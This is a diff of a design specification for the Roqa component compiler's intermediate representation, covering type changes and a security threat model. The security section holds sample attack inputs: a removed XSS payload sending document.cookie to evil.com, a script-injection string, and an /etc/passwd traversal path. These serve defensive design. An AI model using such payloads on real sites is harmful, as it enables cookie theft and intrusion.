@@ -54,17 +54,16 @@ should produce the same IR. The class `"button"` and `["button"]` both produce
 the same `ClassIR`. This means the code generator only handles one form.
 
 **5. Frontend-independent** — the IR doesn't know whether it came from JSX,
-a DSL, a GUI web builder, or an AI agent generating JSON directly. Any frontend
+a custom DSL, a GUI web builder, or any other authoring tool. Any frontend
 that can produce valid IR can use the same backend. This is what makes the
 multi-frontend architecture possible:
 
 ```txt
-JSX frontend           \
-TRSX frontend           \
-DSL frontend             \
-GUI web builder           → Roqa IR → Backend codegen → Optimized JS
-AI agent output          /
-Other programming langs /
+JSX frontend             \
+Custom DSL frontend       \
+GUI web builder            \
+AI-built authoring tools    → Roqa IR → Backend codegen → Optimized JS
+Other programming langs    /
 ```
 
 ### How to read IR type definitions
@@ -126,24 +125,24 @@ The most important concept in this IR is the difference between **static** and
 A **static value** is known at build time and baked into the HTML template:
 
 ```ts
-{ kind: "static", value: "increment-button" }  // becomes id="increment-button" in template
-{ kind: "text", value: "Count is " }            // becomes literal text in template
+{ kind: "literal", value: "increment-button" }  // becomes id="increment-button" in template
+{ kind: "text", value: "Count is " }             // becomes literal text in template
 ```
 
 A **reactive value** is a reference to state that can change at runtime:
 
 ```ts
 { kind: "state-read", name: "count" }  // becomes a binding that updates when count changes
-{ kind: "state-ref", name: "todos" }   // becomes a cell subscription
+{ kind: "cell-ref", name: "todos" }    // becomes a cell subscription
 ```
 
 The code generator treats these fundamentally differently:
-- Static values go into `template("<html>")` strings
+- Static values (`LiteralExpr`) go into `template("<html>")` strings
 - Reactive values become cell declarations, binding setup, text node
   `nodeValue` updates, etc.
 
-A **state-ref** vs a **state-read** matters too:
-- `state-ref` = "give me the cell itself" — used by `showBlock()`,
+A **cell-ref** vs a **state-read** matters too:
+- `cell-ref` = "give me the cell itself" — used by `showBlock()`,
   `forBlock()` for subscription
 - `state-read` = "give me the current value" — used in text content,
   attribute bindings, class conditions
@@ -255,7 +254,6 @@ type ComponentIR = {
 type ComponentMetadata = {
     sourceFile?: string;          // Original source file path
     frontend?: string;            // Which frontend produced this IR (e.g., "jsx", "builder")
-    slots?: SlotIR[];             // Web component slot declarations
     imports?: ImportIR[];         // External dependencies
 };
 ```
@@ -298,11 +296,13 @@ strings, which defeats the purpose of having a frontend-independent IR.
 type ExprIR =
     | LiteralExpr
     | TemplateLiteralExpr
+    | ObjectExpr
     | StateReadExpr
     | StateWriteExpr
     | PropReadExpr
     | AttrReadExpr
     | ComputedReadExpr
+    | ParamReadExpr
     | BinaryExpr
     | UnaryExpr
     | ConditionalExpr
@@ -342,6 +342,17 @@ type TemplateLiteralExpr = {
                                   // e.g., ["Hello ", <expr>, "!"] for `Hello ${name}!`
 };
 
+// Construct a plain object literal: { key: value, ...spread }
+// Common in UI logic for creating new items, building payloads, merging objects.
+type ObjectExpr = {
+    kind: "object";
+    properties: ObjectPropertyIR[];
+};
+
+type ObjectPropertyIR =
+    | { kind: "property"; key: string; value: ExprIR }
+    | { kind: "spread"; argument: ExprIR };
+
 // Read the current value of a state cell
 type StateReadExpr = {
     kind: "state-read";
@@ -372,6 +383,16 @@ type AttrReadExpr = {
 type ComputedReadExpr = {
     kind: "computed-read";
     name: string;
+};
+
+// Read a parameter by name (action params, closure params, event param)
+// Replaces opaque source strings like "id", "t", "e.target.value".
+// The name must match a parameter declared in the enclosing ActionIR.params
+// or ClosureExpr.params. For inline event handlers, the implicit event
+// parameter is always named "e".
+type ParamReadExpr = {
+    kind: "param-read";
+    name: string;                 // Parameter name: "id", "t", "e", etc.
 };
 
 // Read a field of the current list item (inside each() render callbacks)
@@ -501,7 +522,7 @@ type DestructuredBinding = {
 type CollectionOpExpr = {
     kind: "collection-op";
     op: "insert" | "remove" | "update" | "remove-where" | "move" | "clear";
-    collection: string;           // Name of the state collection
+    name: string;                 // Name of the state collection
     args: ExprIR[];               // Operation-specific arguments
 };
 
@@ -633,7 +654,7 @@ And a computed value:
                 "op": "!",
                 "operand": {
                     "kind": "member",
-                    "object": { "kind": "call", "callee": { "kind": "literal", "value": "t" }, "args": [] },
+                    "object": { "kind": "param-read", "name": "t" },
                     "property": "completed"
                 }
             }
@@ -758,8 +779,7 @@ type NodeIR =
     | TextIR
     | ReactiveTextIR
     | ShowIR
-    | EachIR
-    | RawHtmlIR;
+    | EachIR;
 ```
 
 ### `ElementIR` — an HTML element
@@ -772,7 +792,7 @@ type ElementIR = {
     kind: "element";
     tag: string;                  // HTML tag name (e.g., "div", "button")
     ref?: string;                 // Named ref for lifecycle access
-    attributes: Record<string, StaticValue | ReactiveRead>;
+    attributes: Record<string, ExprIR>;
     events: EventBindingIR[];
     children: NodeIR[];
     classes?: ClassIR;
@@ -780,11 +800,30 @@ type ElementIR = {
 };
 ```
 
+Attribute values are `ExprIR` nodes. Static attributes use `LiteralExpr`,
+reactive attributes use `StateReadExpr`, `PropReadExpr`, `ComputedReadExpr`,
+or any other expression. This means attributes can hold computed expressions
+(e.g., `data-total={count + 1}` → a `BinaryExpr`) without falling back to
+`OpaqueExpr`.
+
 The code generator splits this into:
-- **Template**: the tag + static attributes → HTML string
+- **Template**: the tag + static attributes (those with `LiteralExpr` values) → HTML string
 - **Traversal**: firstChild/nextSibling chains to reach dynamic points
-- **Bindings**: reactive attributes/classes/styles → binding setup
+- **Bindings**: non-literal attribute expressions → binding setup
 - **Events**: event bindings → `element.__click = handler` assignments
+
+**`class` attribute vs `classes` field:** These are mutually exclusive. When a
+component needs conditional classes, use the `classes` field with `ClassListIR`.
+When all classes are static, use either `classes` with `StaticClassIR` or put
+`class` in `attributes` as a `LiteralExpr` — both are valid and produce the
+same output. Frontends must not set both `attributes.class` and `classes` on
+the same element — validation will reject this as ambiguous.
+
+The distinction matters for code generation: if `classes` is present and contains
+any conditional items (`ClassListIR`), the template HTML omits the `class`
+attribute entirely and the full `className` is set via a runtime binding. If
+`classes` is absent and `attributes.class` is a `LiteralExpr`, the class goes
+directly into the template HTML string.
 
 ### `TextIR` — static text
 
@@ -802,7 +841,8 @@ Goes directly into the template HTML string. No binding needed.
 ```ts
 type ReactiveTextIR = {
     kind: "reactive-text";
-    source: ReactiveRead;         // Which reactive value to display
+    source: ExprIR;               // Expression to display (typically StateReadExpr,
+                                  // ComputedReadExpr, PropReadExpr, or ItemFieldReadExpr)
 };
 ```
 
@@ -819,26 +859,27 @@ avoids creating unnecessary DOM text nodes:
 // MIR children:
 [
     { "kind": "text", "value": "Count: " },
-    { "kind": "reactive-text", "source": { ... "name": "count" } },
+    { "kind": "reactive-text", "source": { "kind": "state-read", "name": "count" } },
     { "kind": "text", "value": " / Doubled: " },
-    { "kind": "reactive-text", "source": { ... "name": "doubled" } }
+    { "kind": "reactive-text", "source": { "kind": "computed-read", "name": "doubled" } }
 ]
 
 // Template: '<p> </p>'  (single space = single text node)
-// Binding: p_1_text.nodeValue = "Count: " + count.v + " / Doubled: " + doubled.v;
+// Binding: p_1_text.nodeValue = "Count: " + count.v + " / Doubled: " + count.v * 2;
 ```
 
-Note: this has its own `kind: "reactive-text"` distinct from the `ReactiveRead`
-ref type (`kind: "reactive-read"`) — they serve different roles. A
-`ReactiveTextIR` is a node in the view tree. A `ReactiveRead` is a value
-reference that can appear in attributes, conditions, etc.
+Note: `ReactiveTextIR` has its own `kind: "reactive-text"` distinct from the
+expression nodes it contains. A `ReactiveTextIR` is a node in the view tree
+(it tells the code generator "create a text node here"). The `ExprIR` inside
+its `source` tells the code generator what value to display and which cells
+to subscribe to.
 
 ### `ShowIR` — conditional rendering
 
 ```ts
 type ShowIR = {
     kind: "show";
-    condition: StateRef;          // Cell to subscribe to
+    condition: CellRef;           // Cell to subscribe to
     render: NodeIR[];             // View tree when truthy
     fallback?: NodeIR[];          // Optional view tree when falsy
 };
@@ -846,7 +887,7 @@ type ShowIR = {
 
 Lowered to `showBlock(container, conditionCell, renderFn)`.
 
-The `condition` is a **state-ref** (not a reactive-read) — the code generator
+The `condition` is a **cell-ref** (not an expression read) — the code generator
 passes the cell directly to `showBlock()` for subscription.
 
 ### `EachIR` — list rendering
@@ -854,9 +895,8 @@ passes the cell directly to `showBlock()` for subscription.
 ```ts
 type EachIR = {
     kind: "each";
-    source: StateRef;             // Cell containing the array
+    source: CellRef;              // Cell containing the array
     key?: string | null;          // Key field name or null for identity
-    blockId: string;              // Unique identifier for this list block
     itemAlias: string;            // Variable name for the current item (e.g., "todo")
     render: NodeIR[];             // View tree for each item
 };
@@ -868,95 +908,28 @@ The `itemAlias` names the iteration variable in the generated `forBlock` render
 callback. The backend derives which item fields are accessed by walking the
 render tree for `item-field-read` expression nodes.
 
-### `RawHtmlIR` — trusted HTML escape hatch
-
-```ts
-type RawHtmlIR = {
-    kind: "raw-html";
-    html: string | ReactiveRead;
-    ref?: string;
-};
-```
-
 ---
 
-## MIR: Ref types
+## MIR: CellRef
 
-These appear throughout the MIR as values in attributes, children, conditions,
-etc. They are the "pointers" that connect the view tree to the component's
-state, props, actions, and list items.
-
-### `StaticValue` — build-time constant
+The only remaining ref type. This exists because it expresses a fundamentally
+different operation from reading a value — it means "give me the cell object
+itself" for subscription, not "give me the current value."
 
 ```ts
-type StaticValue = {
-    kind: "static";
-    value: string | number | boolean;
-};
-```
-
-### `ReactiveRead` — current value of a reactive source
-
-```ts
-type ReactiveRead = {
-    kind: "reactive-read";
-    source: "state" | "prop" | "attr" | "computed";
+type CellRef = {
+    kind: "cell-ref";
     name: string;
 };
 ```
 
-Means "read this value now and update the binding when it changes." Used in
-attribute values, class conditions, style values, and as the source for
-`ReactiveTextIR` nodes.
+Used by `ShowIR` and `EachIR` to pass the cell directly to `showBlock()` and
+`forBlock()` for subscription. The `name` can reference any state-kind entry
+(value, collection, or computed) — all become cells at runtime.
 
-### `StateRef` — reference to a cell itself
-
-```ts
-type StateRef = {
-    kind: "state-ref";
-    name: string;
-};
-```
-
-Used by `ShowIR` and `EachIR` to pass the cell directly for subscription.
-Distinct from `ReactiveRead` — a state-ref says "I need the cell object
-itself" while a reactive-read says "I need the current value."
-
-### `ActionRef` — reference to an action handler
-
-```ts
-type ActionRef = {
-    kind: "action-ref";
-    name: string;
-};
-```
-
-Used as event handlers.
-
-### `BoundActionRef` — action with pre-bound arguments
-
-```ts
-type BoundActionRef = {
-    kind: "bound-action";
-    name: string;
-    args: ExprIR[];
-};
-```
-
-Used for parameterized handlers (e.g., toggling a specific todo).
-Lowers to the array-form delegated event: `el.__change = [toggleTodo, id]`.
-
-### `ItemFieldRef` — field of a list item
-
-```ts
-type ItemFieldRef = {
-    kind: "item-field-ref";
-    field: string;
-};
-```
-
-Produced inside `EachIR` render trees when accessing properties of the current
-list item.
+Distinct from `StateReadExpr` (`kind: "state-read"`) — a `CellRef` says "I
+need the cell object itself" while a `StateReadExpr` says "I need the current
+value (`.v`)."
 
 ---
 
@@ -965,16 +938,28 @@ list item.
 ```ts
 type EventBindingIR = {
     event: string;                // DOM event name: "click", "input", etc.
-    handler:
-        | ActionRef
-        | BoundActionRef
-        | InlineHandlerIR;
+    handler: ExprIR;              // Handler expression — typically one of:
+                                  //   ActionCallExpr   → named action reference
+                                  //   ClosureExpr      → inline handler with body
+                                  //   CallExpr         → bound action with args
 };
+```
 
-type InlineHandlerIR = {
-    kind: "inline-handler";
-    body: ExprIR;                 // Handler logic as a structured expression
-};
+Event handlers are `ExprIR` nodes. The most common forms:
+
+- **Named action** — `{ kind: "action-call", name: "increment", args: [] }`.
+  Lowers to `el.__click = increment`.
+- **Bound action** — `{ kind: "action-call", name: "toggleTodo", args: [{ kind: "item-field-read", field: "id" }] }`.
+  Lowers to `el.__click = [toggleTodo, id]` (array-form delegated event).
+- **Inline handler** — `{ kind: "closure", params: ["e"], body: <ExprIR> }`.
+  Lowers to `el.__input = (e) => { ... }`.
+
+```ts
+// REMOVED: ActionRef, BoundActionRef, and InlineHandlerIR are no longer
+// separate types. They are expressed using standard ExprIR nodes:
+//   ActionRef        → ActionCallExpr { name, args: [] }
+//   BoundActionRef   → ActionCallExpr { name, args: [...] }
+//   InlineHandlerIR  → ClosureExpr { params: ["e"], body: <ExprIR> }
 ```
 
 ---
@@ -1001,7 +986,7 @@ type ClassListIR = {
 
 type ClassItemIR =
     | string                                          // Static class name
-    | { name: string; condition: ReactiveRead | ItemFieldRef };  // Conditional class
+    | { name: string; condition: ExprIR };            // Conditional class
 ```
 
 Normalization — all of these source forms produce the same MIR:
@@ -1025,7 +1010,7 @@ class={["todo", { completed: todo.completed }]}
     "kind": "class-list",
     "items": [
         "todo",
-        { "name": "completed", "condition": { "kind": "item-field-ref", "field": "completed" } }
+        { "name": "completed", "condition": { "kind": "item-field-read", "field": "completed" } }
     ]
 }
 ```
@@ -1054,7 +1039,7 @@ type StyleMapIR = {
 
 type StylePropertyIR = {
     property: string;             // CSS property name, always kebab-case (e.g., "font-size")
-    value: StaticValue | ReactiveRead;
+    value: ExprIR;                // LiteralExpr for static, StateReadExpr etc. for reactive
 };
 ```
 
@@ -1119,15 +1104,6 @@ type EmitIR = {
     kind: "emit-decl";
     name: string;                 // Internal handle name (e.g., "todoAdded")
     eventName: string;            // DOM event name (e.g., "todo-added")
-};
-```
-
-### Slots — web component content insertion points
-
-```ts
-type SlotIR = {
-    kind: "slot";
-    name?: string;                // Named slot (omit for default slot)
 };
 ```
 
@@ -1222,19 +1198,19 @@ increments the count.
             "kind": "element",
             "tag": "button",
             "attributes": {
-                "id": { "kind": "static", "value": "increment-button" }
+                "id": { "kind": "literal", "value": "increment-button" }
             },
             "events": [
                 {
                     "event": "click",
-                    "handler": { "kind": "action-ref", "name": "increment" }
+                    "handler": { "kind": "action-call", "name": "increment", "args": [] }
                 }
             ],
             "children": [
                 { "kind": "text", "value": "Count is " },
-                { "kind": "reactive-text", "source": { "kind": "reactive-read", "source": "state", "name": "count" } },
+                { "kind": "reactive-text", "source": { "kind": "state-read", "name": "count" } },
                 { "kind": "text", "value": " / doubled is " },
-                { "kind": "reactive-text", "source": { "kind": "reactive-read", "source": "computed", "name": "doubled" } }
+                { "kind": "reactive-text", "source": { "kind": "computed-read", "name": "doubled" } }
             ]
         }
     ]
@@ -1256,7 +1232,7 @@ increments the count.
    - Generates traversal: `const button_1 = this.firstChild`
    - Generates text node ref: `const button_1_text = button_1.firstChild`
 
-4. **Processes `events`** → sees `click` with `action-ref` "increment":
+4. **Processes `events`** → sees `click` with `action-call` "increment":
    - Emits `button_1.__click = increment`
    - Records "click" for `delegate()` call
 
@@ -1292,7 +1268,7 @@ defineComponent("counter-button", function CounterButton() {
             count.ref_1.nodeValue = "Count is " + count.v;
         };
 
-        button_1_text.nodeValue = "Count is " + count.v + " / doubled is " + doubled.v;
+        button_1_text.nodeValue = "Count is " + count.v + " / doubled is " + count.v * 2;
         count.ref_1 = button_1_text;
     });
 });
@@ -1334,18 +1310,9 @@ section specifies that contract.
 ### Validation
 
 The backend validates the MIR before code generation. Validation errors mean
-the frontend produced invalid IR and must be fixed at the frontend level.
-
-| Check | Severity | Description |
-| --- | --- | --- |
-| `invalid-version` | error | MIR version doesn't match the backend's expected version |
-| `invalid-tag-name` | error | Tag name is not a valid custom element name |
-| `duplicate-name` | error | Duplicate name in state, actions, props, attrs, or emits |
-| `dangling-state-ref` | error | Render tree references a state name that doesn't exist |
-| `dangling-action-ref` | error | Event handler references an action that doesn't exist |
-| `missing-key` | warning | `EachIR` without a `key` — may cause inefficient reconciliation |
-| `unreachable-action` | warning | Action declared but never referenced in render or lifecycle |
-| `unsubscribed-state` | warning | State declared but never read in render |
+the frontend produced invalid IR and must be fixed at the frontend level. See
+[compiler.md §Phase 1](./compiler.md#phase-1-validate) for the full list of
+validation checks and their severities.
 
 ### Serialization format
 
@@ -1377,19 +1344,36 @@ tag name:
     "kind": "element",
     "tag": "todo-item",
     "attributes": {
-        "text": { "kind": "reactive-read", "source": "state", "name": "itemText" }
+        "text": { "kind": "state-read", "name": "itemText" }
     },
     "events": [
-        { "event": "remove", "handler": { "kind": "action-ref", "name": "removeItem" } }
+        { "event": "remove", "handler": { "kind": "action-call", "name": "removeItem", "args": [] } }
     ],
     "children": []
 }
 ```
 
 The backend treats custom element tags the same as native HTML tags at the
-template and traversal level. Attributes on custom elements become the child
-component's props/attrs (resolved at runtime by the child's
-`defineComponent()`).
+template and traversal level.
+
+### Attributes on custom elements vs native elements
+
+The MIR does not distinguish between attributes on native HTML elements and
+attributes on custom elements — both use `ElementIR.attributes`. The
+**compiler** is responsible for detecting custom element tags (tags containing
+a hyphen) and generating the correct output:
+
+- **Native HTML element attributes** → static attributes go into the template
+  HTML, dynamic attributes use property assignment or `setAttribute()`.
+- **Custom element attributes** → attributes become props passed via the
+  runtime's `setProp()` mechanism (WeakMap-based), which allows props to be
+  set before the child element's `connectedCallback` fires.
+
+This distinction is intentionally a **compiler concern**, not a MIR concern.
+The MIR stays simple — a parent component doesn't need to know how a child
+component declares its props/attrs. The runtime's `getProps()` function
+resolves the mapping at connect time based on how the child's
+`defineComponent()` is configured.
 
 Cross-component type checking (e.g., verifying that a parent passes the right
 props to a child) is **not** part of the MIR or backend. This is a frontend
@@ -1420,7 +1404,7 @@ Every IR node has a `kind` field. This is deliberate:
 
 Earlier drafts captured action and computed bodies as raw JavaScript source
 strings. This was simpler but broke frontend-independence — a GUI builder or
-AI agent shouldn't need to generate JavaScript text. The structured expression
+a custom DSL shouldn't need to generate JavaScript text. The structured expression
 IR is more verbose but provides:
 
 1. **Frontend-independence** — any tool that can produce JSON can produce
@@ -1436,26 +1420,49 @@ would be impractical (complex algorithms, external library calls). But every
 opaque expression is a missed optimization opportunity, so frontends should
 prefer structured expressions.
 
-### Why separate `state-ref` from `reactive-read`?
+### Why separate `cell-ref` from expression reads?
 
 These represent fundamentally different operations:
 
-- `state-ref` = "I need the cell object itself" → used for subscription
+- `cell-ref` = "I need the cell object itself" → used for subscription
   (`forBlock`, `showBlock`)
-- `reactive-read` = "I need the current value" → used for rendering
-  (`nodeValue`, `className`, attribute values)
+- `state-read` / `computed-read` / etc. = "I need the current value" → used
+  for rendering (`nodeValue`, `className`, attribute values)
 
 Collapsing them into one type would force the code generator to infer intent
 from context, which is exactly the kind of ambiguity an IR should eliminate.
+The name `CellRef` (rather than the earlier `StateRef`) reflects that any
+state-kind entry (value, collection, or computed) becomes a cell at runtime.
+
+### Why unify ref types into ExprIR?
+
+Earlier drafts had two parallel type systems: "ref types" (`StaticValue`,
+`ReactiveRead`, `ActionRef`, `BoundActionRef`, `ItemFieldRef`) used in the
+view tree, and `ExprIR` used in action/computed bodies. These overlapped
+significantly — `StaticValue` was just `LiteralExpr`, `ReactiveRead` was
+just `StateReadExpr`/`PropReadExpr`/etc.
+
+Unifying into `ExprIR` everywhere eliminates the parallel type system and
+provides concrete benefits:
+
+1. **Expressiveness** — attributes, class conditions, and style values can
+   now hold arbitrary expressions (`data-total={count + 1}`), not just
+   single-value reads.
+2. **Fewer types** — frontends produce one expression system, not two.
+3. **Consistency** — the backend walks expression trees the same way
+   regardless of context (action body, attribute value, class condition).
+
+The `CellRef` survives as the only non-ExprIR ref type because it has
+genuinely different semantics (cell identity for subscription, not a value).
 
 ### Why a separate `reactive-text` node kind?
 
-The view tree needs every child to have a unique, unambiguous `kind`. A
-`reactive-read` reference can appear in many contexts (attribute values, class
-conditions, style values), but when it appears as a child of an element, it
-specifically means "create a text node and bind it." Giving it the distinct
-`kind: "reactive-text"` makes this role explicit and prevents the code generator
-from needing to infer context.
+The view tree needs every child to have a unique, unambiguous `kind`. An
+expression can appear in many contexts (attribute values, class conditions,
+style values), but when it appears as a child of an element, it specifically
+means "create a text node and bind it." Giving it the distinct
+`kind: "reactive-text"` makes this role explicit and prevents the code
+generator from needing to infer context.
 
 ### Why `render` is an array, not a single `NodeIR`
 
@@ -1481,13 +1488,6 @@ is breaking.
 ---
 
 ## Open questions
-
-### HIR specification
-
-This document intentionally does not specify HIR formats — each frontend
-defines its own. However, a reference HIR for the JSX frontend would be
-valuable as an example for other frontend authors. This should be a separate
-document (e.g., `spec/jsx-frontend.md`).
 
 ### Variable declarations and assignments
 
@@ -1577,7 +1577,7 @@ could produce IR that generates dangerous code.
 The IR may be produced by:
 - A trusted JSX frontend running in the developer's build pipeline
 - A third-party frontend (DSL, GUI builder) that may have bugs
-- An AI agent generating IR from natural language prompts
+- A frontend built by an AI agent or other automated tooling
 - A `.roqa-ir.json` file that could have been hand-edited or tampered with
 
 The backend must produce safe output regardless of the IR source. "Safe" means:
@@ -1586,42 +1586,7 @@ no DOM clobbering, no prototype pollution.
 
 ### Risk areas and mitigations
 
-#### 1. `RawHtmlIR` — XSS injection (CRITICAL)
-
-**Risk:** `RawHtmlIR` inserts arbitrary HTML into the DOM. If the HTML comes
-from user input (or an untrusted IR source), this is a direct XSS vector.
-
-```json
-{
-    "kind": "raw-html",
-    "html": "<img src=x onerror='fetch(`https://evil.com?cookie=${document.cookie}`)'>"
-}
-```
-
-**Mitigations:**
-- **Validation warning:** The backend should emit a `raw-html-used` warning
-  for every `RawHtmlIR` node. This makes usage visible and auditable.
-- **Static-only by default:** When the `html` field is a static string (not a
-  `ReactiveRead`), the backend can analyze it at build time and reject
-  dangerous patterns (script tags, event handlers, javascript: URLs).
-- **Runtime sanitization option:** For reactive `RawHtmlIR` (where the HTML
-  is dynamic), the backend should inject a sanitizer call by default. The
-  component author can opt out with an explicit `trusted: true` flag:
-
-```ts
-type RawHtmlIR = {
-    kind: "raw-html";
-    html: string | ReactiveRead;
-    trusted?: boolean;            // If true, skip runtime sanitization (use with caution)
-    ref?: string;
-};
-```
-
-- **Consider removing `RawHtmlIR` from v1** — if there's no pressing use
-  case, omitting it entirely eliminates the attack surface. It can be added
-  later when a safe pattern is established.
-
-#### 2. `OpaqueExpr` — arbitrary code execution (HIGH)
+#### 1. `OpaqueExpr` — arbitrary code execution (HIGH)
 
 **Risk:** `OpaqueExpr.source` is raw JavaScript that gets embedded directly in
 the output. A malicious IR could inject arbitrary code:
@@ -1647,20 +1612,20 @@ the output. A malicious IR could inject arbitrary code:
 - **Sandboxing consideration:** For high-security contexts, the backend could
   wrap opaque source in a restricted scope that limits available globals.
 
-#### 3. Event handler injection (MEDIUM)
+#### 2. Event handler injection (MEDIUM)
 
-**Risk:** An `InlineHandlerIR` with a malicious body expression could
+**Risk:** An inline event handler with a malicious body expression could
 exfiltrate data or perform unintended actions.
 
 **Mitigations:**
-- Inline handlers use the structured `ExprIR` by default — the backend
-  controls what code is generated.
-- For `InlineHandlerIR` nodes, the body is an `ExprIR`, not raw source —
-  this limits what can be expressed to the IR's operation set.
-- The `ActionRef` and `BoundActionRef` patterns are preferred over inline
+- Inline handlers use the structured `ExprIR` — the backend controls what
+  code is generated.
+- Event handler bodies are `ExprIR` nodes, not raw source — this limits what
+  can be expressed to the IR's operation set.
+- Named action references (`ActionCallExpr`) are preferred over inline
   handlers, keeping logic centralized in declared actions.
 
-#### 4. DOM clobbering via attribute values (MEDIUM)
+#### 3. DOM clobbering via attribute values (MEDIUM)
 
 **Risk:** Static attribute values could be crafted to interfere with DOM APIs.
 For example, setting `id` or `name` to values that shadow global properties.
@@ -1671,13 +1636,13 @@ For example, setting `id` or `name` to values that shadow global properties.
 - **Attribute name blocklist:** Reject or warn on dangerous attribute names
   like `is` (custom element hijacking) or `srcdoc` (iframe injection).
 
-#### 5. Template injection (MEDIUM)
+#### 4. Template injection (MEDIUM)
 
 **Risk:** If a static string value in the MIR contains unescaped HTML, it
 could break out of the template context. For example:
 
 ```json
-{ "kind": "static", "value": "</button><script>alert('xss')</script><button>" }
+{ "kind": "literal", "value": "</button><script>alert('xss')</script><button>" }
 ```
 
 **Mitigations:**
@@ -1686,7 +1651,7 @@ could break out of the template context. For example:
 - **Template strings are build-time only** — they come from the IR, not from
   user input at runtime. The risk is limited to malicious IR producers.
 
-#### 6. Prototype pollution via initial state values (LOW)
+#### 5. Prototype pollution via initial state values (LOW)
 
 **Risk:** `StateValueIR.initial` accepts `unknown` — a malicious IR could set
 initial values with `__proto__` properties.
@@ -1697,7 +1662,7 @@ initial values with `__proto__` properties.
 - **Validation check:** Reject initial values with `__proto__`,
   `constructor`, or `prototype` keys.
 
-#### 7. Import path traversal (LOW)
+#### 6. Import path traversal (LOW)
 
 **Risk:** `ImportedRefExpr.source` could contain path traversal:
 `"../../../etc/passwd"` or `"file:///..."`.
@@ -1713,7 +1678,6 @@ initial values with `__proto__` properties.
 The backend should support a `strict` security mode that:
 - Promotes all security-related warnings to errors
 - Rejects all `OpaqueExpr` nodes
-- Rejects all `RawHtmlIR` nodes
 - Validates all import paths against an allowlist
 - Runs static analysis on all string values for injection patterns
 
@@ -1757,7 +1721,7 @@ does not attempt to model CSS-in-JS, CSS modules, or utility-class frameworks
 - Trying to model CSS in the IR would massively expand the spec with little
   benefit
 - The output is standard web components — CSS can be applied externally via
-  shadow DOM, adopted stylesheets, or regular stylesheets
+  regular stylesheets, adopted stylesheets, or (in the future) shadow DOM
 
 A future `StylesheetIR` could associate a component with its CSS (e.g., for
 shadow DOM encapsulation), but this is not part of v1.
@@ -1911,25 +1875,47 @@ compilation concern (the backend must split code), not just a runtime concern.
 
 ---
 
-## Open questions
+## Next steps
 
-### Async expressions
-
-The expression IR has no concept of `async`/`await`. For the initial
-implementation this is fine — reactive UI updates should be synchronous. But
-actions that fetch data or perform async operations will eventually need
-support. See the server functions section above for how this interacts with
-the broader meta-framework story.
-
-### Variable declarations
-
-The expression IR lacks local variable declarations. Action bodies that need
-temporaries currently require nested expressions or `OpaqueExpr`. A `LetExpr`
-node may be needed as real-world component complexity grows.
-
-### HIR specification
+### Canonical JSX frontend HIR
 
 This document intentionally does not specify HIR formats — each frontend
-defines its own. However, a reference HIR for the JSX frontend would be
-valuable as an example for other frontend authors. This should be a separate
-document (e.g., `spec/jsx-frontend.md`).
+defines its own. A canonical HIR specification for the JSX frontend will
+eventually be created as a separate document (e.g., `spec/jsx-frontend.md`).
+This will serve as a reference implementation for other frontend authors and
+document how JSX syntax maps to MIR constructs.
+
+### Shadow DOM and slots
+
+Roqa components currently render as custom elements with **light DOM** — the
+component markup is rendered as direct children of the custom element. Shadow
+DOM is not supported in v1.
+
+Future versions may add Shadow DOM support, which would enable:
+- Style encapsulation via shadow roots
+- `<slot>` elements for content projection (a `SlotIR` node in the MIR)
+- Adopted stylesheets scoped to the component
+
+When Shadow DOM support is added, the MIR will be extended with optional
+`shadow` configuration on `ComponentIR` and `SlotIR` nodes in the
+`ComponentMetadata`. The default will remain light DOM for backward
+compatibility.
+
+### `RawHtmlIR` — trusted HTML insertion
+
+A `RawHtmlIR` node type (`kind: "raw-html"`) for inserting trusted HTML
+strings directly into the DOM is deferred from v1. This is a significant
+security concern — it creates a direct XSS attack vector if the HTML comes
+from untrusted sources.
+
+When this is added in a future version, it will require:
+- A `raw-html-used` validation warning for every usage
+- Static analysis of HTML strings at build time to reject dangerous patterns
+  (script tags, event handler attributes, `javascript:` URLs)
+- Optional runtime sanitization for dynamic (reactive) HTML values
+- A `trusted: boolean` flag for explicitly opting out of sanitization
+- Full support in the `strict` security mode (reject all `RawHtmlIR` in
+  strict mode)
+
+Until `RawHtmlIR` is implemented, components that need to render HTML strings
+should use standard DOM APIs via `OpaqueExpr` or lifecycle hooks.
